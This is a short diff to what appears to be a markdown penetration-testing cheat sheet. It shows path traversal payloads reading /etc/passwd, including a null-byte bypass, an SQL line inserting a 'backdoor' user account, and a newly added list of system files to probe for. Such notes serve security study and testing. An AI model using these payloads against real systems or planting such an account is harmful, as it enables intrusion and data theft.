@@ -1283,7 +1283,10 @@ insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
 - validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
 - validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`
 
-
+**Search for**
+- `windows\win.ini`
+- `c:\windows\system32\drivers\etc\hosts`
+- `etc/passwd`
 
 ### <ins>OS Command Injection</ins>
 
